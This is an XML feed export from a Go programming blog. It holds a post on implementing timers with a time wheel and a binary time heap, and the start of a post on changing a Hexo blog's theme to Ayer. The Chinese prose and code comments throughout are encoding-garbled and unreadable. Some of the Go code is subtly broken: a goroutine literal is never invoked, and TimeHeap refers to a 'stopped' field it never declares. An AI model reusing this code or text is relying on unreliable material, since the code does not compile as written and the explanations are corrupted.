    <content><![CDATA[<p>æœ‰æ—¶æœåŠ¡å™¨éœ€è¦åœ¨æŸä¸€æ—¶é—´ç‚¹è§¦å‘æŸä¸€äº‹ä»¶ï¼Œæ¯”å¦‚ä¸‹åˆä¸‰ç‚¹æ›´æ–°æŸä¸ªèµ„æºã€‚ä¸€ä¸ªå¾ˆè‡ªç„¶çš„æƒ³æ³•æ˜¯ä½¿ç”¨è®¡æ—¶å®¹å™¨æ¥ç®¡ç†æ‰€æœ‰çš„å®šæ—¶äº‹ä»¶ï¼Œç†Ÿæ‚‰ C++ çš„è¯»è€…å¯ä»¥å°†å…¶ç±»æ¯”ä¸º STL ä¸­çš„ vectorã€map ç­‰ã€‚å®šæ—¶å®¹å™¨å†…éƒ¨çš„ä¸€ä¸ªä¸ªå¯¹è±¡åˆ™ç§°ä¸ºå®šæ—¶å™¨ï¼Œæ˜¯å¯¹å®šæ—¶æ—¶é—´çš„å°è£…ã€‚ä½†æ˜¯ä¸ºäº†æ–¹ä¾¿ï¼Œé€šå¸¸ç›´æ¥æŠŠå®šæ—¶å®¹å™¨ç§°ä¸ºå®šæ—¶å™¨ã€‚<br>Go è¯­è¨€æ ‡å‡†åº“å†…ç½®äº†å¯¹å®šæ—¶å™¨çš„æ”¯æŒï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t1 := time.NewTimer(time.Second * <span class="number">5</span>)  <span class="comment">// åˆ›å»ºä¸€ä¸ª 5s ååˆ°æœŸçš„ timer</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-t1.C:</span><br><span class="line">            fmt.Println(<span class="string">&quot;5s timer&quot;</span>)</span><br><span class="line">            t1.Reset(time.Second * <span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šç¨‹åºæ¯éš” 5s æ‰“å°ä¸€ä¸ª â€œ5s timerâ€ï¼ŒåŸå› æ˜¯ runtime æ¯ 5s è§¦å‘ä¸€æ¬¡å®šæ—¶äº‹ä»¶ï¼ˆå‘ t1.C ä¸­å‘é€ä¸€ä¸ª time.Timeï¼‰ã€‚</p>
<p>ä¸åŒç±»å‹çš„å®šæ—¶å™¨ç”¨ä¸åŒçš„æ•°æ®ç»“æ„æ¥ç»„ç»‡å®šæ—¶äº‹ä»¶ã€‚ç›®å‰ç”Ÿäº§ä¸­æ¯”è¾ƒå¸¸ç”¨çš„æ–¹å¼æ˜¯å››å‰å †ï¼Œå®ƒçš„å®šæ—¶è¾ƒä¸ºç²¾ç¡®ä¸”å„ç§æ“ä½œçš„æ—¶é—´å¤æ‚åº¦è¾ƒå¥½ã€‚æœ¬æ–‡å°†ä¼šè®²è§£ä¸¤ç§å®ç°æ–¹å¼ï¼šæ—¶é—´è½®ä¸åŸºäºæœ€å°äºŒå‰å †çš„æ—¶é—´å †ã€‚</p>
<h2 id="æ—¶é—´è½®"><a href="#æ—¶é—´è½®" class="headerlink" title="æ—¶é—´è½®"></a>æ—¶é—´è½®</h2><p>é¡¾åæ€ä¹‰æ—¶é—´è½®ä»¥ä¸€ä¸ªâ€œè½®å­â€çš„å½¢å¼ç»„ç»‡å®šæ—¶äº‹ä»¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå®çº¿æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªæ’æ§½ï¼ˆslotï¼‰ï¼Œå®šæ—¶äº‹ä»¶è¢«å°è£…ä¸ºä¸€ä¸ªä¸ªæ¡¶ï¼ˆbucketï¼‰ ä»¥é“¾è¡¨çš„å½¢å¼ä¿å­˜åœ¨ slot ä¸Šã€‚æŒ‡é’ˆæŒ‰é¡ºæ—¶é’ˆè½¬åŠ¨ï¼Œæ¯æ¬¡è½¬åŠ¨ä¸€ä¸ª siï¼ˆslot intervalï¼‰ã€‚æŒ‡é’ˆè½¬åŠ¨ä¸€æ¬¡ï¼Œå³æ£€æŸ¥å½“å‰ slot ä¿å­˜çš„ bucket é“¾è¡¨ï¼Œæ‰§è¡Œè¶…æ—¶ä»»åŠ¡ã€‚</p>
<p><img src="https://i.loli.net/2021/05/19/bw69jgvqoFuVnLp.png" alt="image.png"></p>
<p>é‚£ä¹ˆç°åœ¨é—®é¢˜å°±æ˜¯ç¡®å®šä¸€ä¸ªå®šæ—¶ä»»åŠ¡è¯¥æ”¾åˆ°å“ªä¸ª slot é‡Œã€‚è®¾æ—¶é—´è½®æ§½æ•°ä¸º $N$ï¼Œå½“å‰æŒ‡é’ˆæŒ‡å‘ $cur$ï¼Œå®šæ—¶ä»»åŠ¡çš„å®šæ—¶æ—¶é•¿ä¸º $ti$ï¼Œå¾…æ’å…¥ä½ç½®ä¸º $posi$ï¼Œåˆ™è®¡ç®—å…¬å¼ä¸º$$posi = (cur + (ti / si)) \pmod N$$</p>
<p>ç®—æ³•æ€æƒ³ç±»ä¼¼å“ˆå¸Œè¡¨ï¼ŒæŠŠå¤šä¸ªä»»åŠ¡æŒ‰ç…§å®šæ—¶æ—¶é•¿åˆ†æ•£åˆ°å‡ ä¸ªæ§½ï¼ŒN è¶Šå¤§å•ä¸ªæ§½ä¿å­˜çš„çš„æ¡¶è¶Šå°‘ã€‚ç”±æ­¤å¯è§ï¼Œsi å†³å®šäº†æ—¶é—´è½®çš„ç²¾åº¦ï¼Œè€Œ N å†³å®šäº†ä»»åŠ¡çš„æ‰§è¡Œæ•ˆç‡ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> timeWheel</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;errors&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒå‘é“¾è¡¨</span></span><br><span class="line"><span class="keyword">type</span> bucket <span class="keyword">struct</span> &#123;</span><br><span class="line">    prev, next *bucket</span><br><span class="line">    data <span class="keyword">int</span> <span class="comment">// å›è°ƒå‡½æ•°çš„å‚æ•°</span></span><br><span class="line">    callBack <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int</span>)</span></span></span><br><span class="line">    rotation <span class="keyword">int</span> <span class="comment">// æ—¶é—´è½®è½¬è¿‡å¤šå°‘åœˆä¹‹åè¿™ä¸ªæ¡¶æ‰ç”Ÿæ•ˆ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newBucket</span><span class="params">(rotation <span class="keyword">int</span>, data <span class="keyword">int</span>, callBack <span class="keyword">func</span>(<span class="keyword">int</span>)</span>) *<span class="title">bucket</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="built_in">new</span>(bucket)</span><br><span class="line">    t.callBack = callBack</span><br><span class="line">    t.data = data</span><br><span class="line">    t.rotation = rotation</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TimeWheel <span class="keyword">struct</span> &#123;</span><br><span class="line">    slots []*bucket</span><br><span class="line">    SlotNum <span class="keyword">int</span></span><br><span class="line">    SI time.Duration <span class="comment">// slot interval, è½¬åŠ¨ä¸€ä¸ª slot æ‰€éœ€è¦çš„æ—¶é—´</span></span><br><span class="line">    cur <span class="keyword">int</span> <span class="comment">// å½“å‰æŒ‡å‘çš„ slot</span></span><br><span class="line">    count <span class="keyword">int</span> <span class="comment">// æ—¶é—´è½®é‡Œæ€» bucket è®¡æ•°</span></span><br><span class="line">    stopped <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewTimeWheel</span><span class="params">(si time.Duration, n <span class="keyword">int</span>)</span> *<span class="title">TimeWheel</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;TimeWheel&#123;</span><br><span class="line">        SI: si,</span><br><span class="line">        SlotNum: n,</span><br><span class="line">        slots: <span class="built_in">make</span>([]*bucket, n, n),</span><br><span class="line">        cur: <span class="number">0</span>,</span><br><span class="line">        stopped: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tw *TimeWheel)</span> <span class="title">Add</span><span class="params">(cb <span class="keyword">func</span>(<span class="keyword">int</span>)</span>, <span class="title">data</span> <span class="title">int</span>, <span class="title">timeout</span> <span class="title">time</span>.<span class="title">Duration</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> tw == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> ticks = <span class="number">0</span> <span class="comment">// è®°å½•ä¸€ä¸ª bucket éœ€è¦ç»å†å‡ æ¬¡ tick</span></span><br><span class="line">    <span class="keyword">if</span> timeout &lt; tw.SI &#123;</span><br><span class="line">        ticks = <span class="number">1</span> <span class="comment">// å¦‚æœ timeout å°äº SIï¼Œè¯´æ˜è¿™ä¸ª time wheel ç²¾åº¦ä¸å¤Ÿã€‚ä»¤ ticks ä¸º 1 å³è¿™ä¸ª timer åœ¨ä¸‹ä¸€æ¬¡ tick å°±ä¼šè¢«ä½¿ç”¨</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ticks = <span class="keyword">int</span>(timeout / tw.SI)</span><br><span class="line">    &#125;</span><br><span class="line">    posi := (tw.cur + ticks % tw.SlotNum) % tw.SlotNum <span class="comment">// è®¡ç®—æ’å…¥ä½ç½®</span></span><br><span class="line">    rotation := ticks / tw.SlotNum <span class="comment">// è®¡ç®—æ—¶é—´è½®è¦è½¬å‡ åœˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> b = newBucket(rotation, data, cb)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŠŠ bucket æ’å…¥åˆ°å¯¹åº” slot ä¸­ã€‚å¤´æ’æ³•</span></span><br><span class="line">    <span class="keyword">if</span> tw.slots[posi] == <span class="literal">nil</span> &#123;</span><br><span class="line">        tw.slots[posi] = b</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tw.slots[posi].prev = b</span><br><span class="line">        b.next = tw.slots[posi]</span><br><span class="line">        tw.slots[posi] = b</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tw.count++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éå† cur æŒ‡å‘çš„ slotï¼Œæ‰§è¡Œå…¶ä¸­çš„å®šæ—¶ä»»åŠ¡</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tw *TimeWheel)</span> <span class="title">tick</span><span class="params">()</span></span> &#123;</span><br><span class="line">    tmp := tw.slots[tw.cur]</span><br><span class="line">    <span class="keyword">for</span> tmp != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;tick the bucket once&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> tmp.rotation &gt; <span class="number">0</span> &#123;</span><br><span class="line">            tmp.rotation--</span><br><span class="line">            tmp = tmp.next</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;now: %vms &quot;</span>, time.Now().Nanosecond() / <span class="number">1000000</span>)</span><br><span class="line">            tmp.callBack(tmp.data)</span><br><span class="line">            <span class="comment">// åˆ é™¤è¿™ä¸ª bucket</span></span><br><span class="line">            <span class="keyword">if</span> tmp == tw.slots[tw.cur] &#123;</span><br><span class="line">                newHead := tmp.next</span><br><span class="line">                tmp.next = <span class="literal">nil</span></span><br><span class="line">                <span class="keyword">if</span> newHead != <span class="literal">nil</span> &#123;</span><br><span class="line">                    newHead.prev = <span class="literal">nil</span></span><br><span class="line">                &#125;</span><br><span class="line">                tw.slots[tw.cur] = newHead</span><br><span class="line">                tmp = newHead</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp2 := tmp.next</span><br><span class="line">                tmp.prev.next = tmp2</span><br><span class="line">                <span class="keyword">if</span> tmp2 != <span class="literal">nil</span> &#123;</span><br><span class="line">                    tmp2.prev = tmp.prev</span><br><span class="line">                &#125;</span><br><span class="line">                tmp.prev = <span class="literal">nil</span></span><br><span class="line">                tmp.next = <span class="literal">nil</span></span><br><span class="line">                tmp = tmp2</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cur æŒ‡å‘ä¸‹ä¸€ä¸ª slot</span></span><br><span class="line">    tw.cur++</span><br><span class="line">    tw.cur %= tw.SlotNum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tw *TimeWheel)</span> <span class="title">Tick</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    <span class="keyword">if</span> tw == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            tw.tick()</span><br><span class="line">            time.Sleep(tw.SI)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tw *TimeWheel)</span> <span class="title">Stop</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> tw == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tw.stopped &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ—¶é—´å †"><a href="#æ—¶é—´å †" class="headerlink" title="æ—¶é—´å †"></a>æ—¶é—´å †</h2><p>ä¸Šè¿°æ—¶é—´è½®æœ‰ä¸¤ä¸ªæ˜æ˜¾çš„é—®é¢˜ï¼š</p>
<ol>
<li>ç²¾åº¦ä¾èµ–äº si</li>
<li>è·å– bucket çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(n)</li>
</ol>
<p>å·¥ä¸šä¸Šæœ€å¸¸ç”¨çš„å®šæ—¶å™¨çš„å®ç°æ–¹å¼æ˜¯æ—¶é—´å †ã€‚ç”±æœ€æ—©åˆ°æœŸçš„é‚£ä¸ªä»»åŠ¡å†³å®šå¿ƒè·³é—´éš”ï¼Œè¿™æ ·æ¯æ¬¡å¿ƒè·³å¿…å®šè‡³å°‘æœ‰ä¸€ä¸ªè¶…æ—¶ä»»åŠ¡å¾…å¤„ç†ï¼ŒåŒæ—¶ç”±äºå †çš„ç‰¹æ€§æˆ‘ä»¬æ·»åŠ ã€åˆ é™¤ä¸€ä¸ª bucket çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(logN)ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;errors&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> heapBucket <span class="keyword">struct</span> &#123;</span><br><span class="line">    cb <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int</span>)</span></span></span><br><span class="line">    data <span class="keyword">int</span></span><br><span class="line">    expire time.Time</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TimeHeap æ˜¯ heapBucket.expire çš„æœ€å°äºŒå‰å †</span></span><br><span class="line"><span class="keyword">type</span> TimeHeap <span class="keyword">struct</span> &#123;</span><br><span class="line">    Capacity <span class="keyword">int</span></span><br><span class="line">    arr []*heapBucket</span><br><span class="line">    size <span class="keyword">int</span> <span class="comment">// timer è®¡æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newHeapBucket</span><span class="params">(cb <span class="keyword">func</span>(<span class="keyword">int</span>)</span>, <span class="title">data</span> <span class="title">int</span>, <span class="title">timeout</span> <span class="title">time</span>.<span class="title">Time</span>) *<span class="title">heapBucket</span></span> &#123;</span><br><span class="line">    t := <span class="built_in">new</span>(heapBucket)</span><br><span class="line">    t.cb = cb</span><br><span class="line">    t.data = data</span><br><span class="line">    t.expire = timeout</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewTimeHeap</span><span class="params">(capacity <span class="keyword">int</span>)</span> *<span class="title">TimeHeap</span></span> &#123;</span><br><span class="line">    th := <span class="built_in">new</span>(TimeHeap)</span><br><span class="line">    th.Capacity = capacity</span><br><span class="line">    th.arr = <span class="built_in">make</span>([]*heapBucket, capacity+<span class="number">1</span>, capacity+<span class="number">1</span>) <span class="comment">// ä¸ºäº†ä¾¿äºè®¡ç®—çˆ¶å­ç´¢å¼•ï¼ŒæŠŠ th.arr[0] ä½œä¸ºå“¨å…µï¼Œbucket ä» th.arr[1]å¼€å§‹ä¿å­˜</span></span><br><span class="line">    <span class="keyword">return</span> th</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">Add</span><span class="params">(cb <span class="keyword">func</span>(<span class="keyword">int</span>)</span>, <span class="title">data</span> <span class="title">int</span>, <span class="title">timeout</span> <span class="title">time</span>.<span class="title">Time</span>) <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> th == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> th.size == th.Capacity &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">&quot;heap overflow&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    t := newHeapBucket(cb, data, timeout)</span><br><span class="line">    n := th.size + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»æœ«ç«¯å¼€å§‹ä¸Šæµ®</span></span><br><span class="line">    th.arr[n] = t</span><br><span class="line">    <span class="keyword">for</span> n &gt; <span class="number">1</span> &amp;&amp; th.arr[n/<span class="number">2</span>].expire.After(th.arr[n].expire) &#123;</span><br><span class="line">        tmp := th.arr[n/<span class="number">2</span>]</span><br><span class="line">        th.arr[n/<span class="number">2</span>] = th.arr[n]</span><br><span class="line">        th.arr[n] = tmp</span><br><span class="line">        n /= <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">    th.size++</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">Peek</span><span class="params">()</span> *<span class="title">heapBucket</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> th.size == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> th.arr[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">pop</span><span class="params">()</span></span> &#123;</span><br><span class="line">    th.arr[<span class="number">1</span>] = th.arr[th.size] <span class="comment">// æœ«ç«¯ bucket æ›¿æ¢å †é¡¶ä»¥ä¿æŒå®Œå…¨äºŒå‰æ ‘çš„æ€§è´¨</span></span><br><span class="line">    th.size--</span><br><span class="line">    n := <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é¡¶éƒ¨ä¸‹æ²‰</span></span><br><span class="line">    <span class="keyword">for</span> <span class="number">2</span> * n &lt;= th.size &#123;</span><br><span class="line">        j := <span class="number">2</span> * n</span><br><span class="line">        <span class="keyword">if</span> j &lt; th.size &amp;&amp; th.arr[j].expire.After(th.arr[j+<span class="number">1</span>].expire) &#123;</span><br><span class="line">            j++</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> th.arr[n].expire.After(th.arr[j].expire) &#123;</span><br><span class="line">            tmp := th.arr[j]</span><br><span class="line">            th.arr[j] = th.arr[n]</span><br><span class="line">            th.arr[n] = tmp</span><br><span class="line">            n = j</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">tick</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    <span class="comment">// ä¸æ–­æ£€æŸ¥å †é¡¶ï¼Œæ‰§è¡Œ timer</span></span><br><span class="line">    <span class="keyword">for</span> th.size != <span class="number">0</span> &#123;</span><br><span class="line">        tmp := th.Peek()</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        now := time.Now()</span><br><span class="line">        <span class="keyword">if</span> tmp.expire.After(now) &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fmt.Printf(<span class="string">&quot;tick the bucket once, data: %v, expire time: %v, now: %v\n&quot;</span>, tmp.data, tmp.expire, now)</span><br><span class="line">        tmp.cb(tmp.data)</span><br><span class="line">        th.pop()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">Tick</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> th == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> interval time.Duration</span><br><span class="line">            <span class="keyword">if</span> top := th.Peek(); top != <span class="literal">nil</span> &#123;</span><br><span class="line">                interval = top.expire.Sub(time.Now()) <span class="comment">// å–æœ€çŸ­å¿ƒæé—´éš”</span></span><br><span class="line">            &#125;</span><br><span class="line">            time.Sleep(interval)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> &lt;-th.stopped:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    th.tick()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">Stop</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> th == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    th.stopped &lt;-<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>timer</tag>
      </tags>
  </entry>
  <entry>
    <title>ç»™ä½ çš„hexoåšå®¢æ¢ä¸€ä¸ªä¸»é¢˜å§</title>
    <url>/2021/05/19/%E7%BB%99%E4%BD%A0%E7%9A%84hexo%E5%8D%9A%E5%AE%A2%E6%8D%A2%E4%B8%80%E4%B8%AA%E4%B8%BB%E9%A2%98/</url>
    <content><![CDATA[<p><a href="https://hexo.io/zh-cn/">hexo</a> æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„çš„åšå®¢æ¡†æ¶ï¼Œå®ƒæ”¯æŒ MarkDownï¼Œæ‹¥æœ‰ç¤¾åŒºæä¾›çš„å„å¼å„æ ·çš„æ’ä»¶ï¼Œåªè¦å‡ æ¡ç®€å•çš„æŒ‡ä»¤å°±å¯ä»¥æŠŠåšå®¢éƒ¨ç½²åˆ° Github Pageã€Heroku ç­‰å¹³å°ã€‚<a href="https://github.com/next-theme/hexo-theme-next">NexT</a> åˆ™æ˜¯ hexo ä¸‹å¹¿å—å¥½è¯„çš„åšå®¢ä¸»é¢˜ï¼Œæä¾›äº†å¥½å‡ ç§é¡µé¢å¸ƒå±€ä¾›ç”¨æˆ·é€‰æ‹©ï¼Œå¤©ç„¶é›†æˆäº†è®¸å¤šå¸¸ç”¨æ’ä»¶ï¼Œå› æ­¤è®¸å¤šåšä¸»éƒ½é€‰æ‹©ä»¥å®ƒä¸ºä¾‹å­è®²è¿°å¦‚ä½•æ­å»ºå±äºè‡ªå·±çš„åšå®¢ã€‚ç¬”è€…åœ¨åˆšå…¥é—¨ hexo æ—¶ä¹Ÿé€‰æ‹©äº† NexTï¼Œä½†åœ¨åšå®¢è¿è¡Œä¸‰å¹´å¤šä»¥åå·²ç»å¯¹å…¶äº§ç”Ÿäº†å®¡ç¾ç–²åŠ³ã€‚äº‹å®ä¸Šç¤¾åŒºæä¾›äº†ä¸Šç™¾æ¬¾ä¸»é¢˜å¯ä¾›é€‰æ‹©ï¼Œå…¶ä¸­äº¦ä¸ä¹ä½¼ä½¼è€…ï¼Œæ‰€ä»¥ç¬”è€…å†³å®šå°è¯•å°†åšå®¢ä¸»é¢˜æ›´æ¢ä¸º <a href="https://shen-yu.gitee.io/">Ayer</a> å¹¶è®°å½•ä¸‹æ•´ä¸ªè¸©å‘è¿‡ç¨‹ï¼Œä»¥é£¨åäººã€‚</p>
<h2 id="å®‰è£…-Ayer"><a href="#å®‰è£…-Ayer" class="headerlink" title="å®‰è£… Ayer"></a>å®‰è£… Ayer</h2><p>é¦–å…ˆåœ¨åšå®¢æ ¹ç›®å½•æŠŠ Ayer ä¸‹è½½åˆ° <code>themes/</code>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å›½å†…ç”¨æˆ·å¦‚æœé€Ÿåº¦è¾ƒæ…¢ï¼Œå¯ä»¥æŠŠ github åœ°å€æ›¿æ¢ä¸ºï¼šhttps://gitee.com/mirrors/ayer.git</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Shen-Yu/hexo-theme-ayer.git themes/ayer</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨åšå®¢çš„ <code>_config.yml</code> æ–‡ä»¶é‡Œæ›´æ”¹ä¸»é¢˜é€‰é¡¹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: ayer</span><br></pre></td></tr></table></figure>

<p>ç„¶åç›´æ¥éƒ¨ç½²å°±å¯ä»¥äº†ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>

<p>å¥½äº†ï¼Œç†è®ºä¸Š hexo åˆ‡æ¢ä¸»é¢˜çš„è¿‡ç¨‹å°±æ˜¯è¿™ä¹ˆç®€å•ï¼Œå°±è·ŸæŠŠå¤§è±¡è£…è¿›å†°ç®±ä¸€æ ·ï¼Œåªè¦ä¸‰æ­¥ï¼š</p>
<ol>
<li>æŒ‘é€‰å¹¶ä¸‹è½½å¿ƒä»ªçš„ä¸»é¢˜åˆ°åšå®¢æ ¹ç›®å½•çš„ <code>themes/</code> æ–‡ä»¶å¤¹ä¸‹</li>
<li>æ›´æ”¹åšå®¢é…ç½®æ–‡ä»¶ <code>_config.yml</code> ä¸­çš„ <code>theme</code> é€‰é¡¹</li>
<li>æ›´æ–°å¹¶éƒ¨ç½²åˆ°è¿œç«¯</li>
</ol>
